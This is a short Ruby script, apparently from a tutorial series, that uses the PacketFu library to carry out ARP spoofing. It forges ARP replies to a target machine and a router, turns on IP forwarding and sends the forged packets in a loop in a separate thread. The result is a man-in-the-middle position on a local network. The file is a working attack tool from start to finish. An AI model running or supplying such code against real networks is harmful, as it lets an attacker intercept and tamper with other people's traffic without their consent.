#!/usr/bin/ruby
require 'rubygems'
require 'packetfu'
require 'thread'

# Builds on the previous ARP spoofing example.
# The sending of ARP packets is done in a separate thread. 

# Construct the target's packet
arp_packet_target = PacketFu::ARPPacket.new()
arp_packet_target.eth_saddr = '78:2b:cb:a3:6b:62'       # sender's MAC address
arp_packet_target.eth_daddr = '78:2b:cb:a3:ef:c9'       # target's MAC address
arp_packet_target.arp_saddr_mac = '78:2b:cb:a3:6b:62'   # sender's MAC address
arp_packet_target.arp_daddr_mac = '78:2b:cb:a3:ef:c9'   # target's MAC address
arp_packet_target.arp_saddr_ip = '192.168.0.100'        # router's IP
arp_packet_target.arp_daddr_ip = '192.168.0.13'         # target's IP
arp_packet_target.arp_opcode = 2                        # arp code 2 == ARP reply
 
# Construct the router's packet
arp_packet_router = PacketFu::ARPPacket.new()
arp_packet_router.eth_saddr = '78:2b:cb:a3:6b:62'       # sender's MAC address
arp_packet_router.eth_daddr = '00:1a:6d:38:15:ff'       # router's MAC address
arp_packet_router.arp_saddr_mac = '78:2b:cb:a3:6b:62'   # sender's MAC address
arp_packet_router.arp_daddr_mac = '00:1a:6d:38:15:ff'   # router's MAC address
arp_packet_router.arp_saddr_ip = '192.168.0.13'         # target's IP
arp_packet_router.arp_daddr_ip = '192.168.0.100'        # router's IP
arp_packet_router.arp_opcode = 2                        # arp code 2 == ARP reply

# Enable IP forwarding
`echo 1 > /proc/sys/net/ipv4/ip_forward`

def runspoof(arp_packet_target,arp_packet_router)
  # Send out both packets
  puts "Spoofing...."
  caught=false
  while caught==false do
    sleep 1
    arp_packet_target.to_w(@interface)
    arp_packet_router.to_w(@interface)
  end
end

begin
  puts "Starting the ARP poisoning thread..."
  spoof_thread = Thread.new{runspoof(arp_packet_target,arp_packet_router)} 
  spoof_thread.join
  # Catch the interrupt and kill the thread
  rescue Interrupt
  puts "\nARP spoof stopped by interrupt signal."
  Thread.kill(spoof_thread)
  `echo 0 > /proc/sys/net/ipv4/ip_forward`
  exit 0
end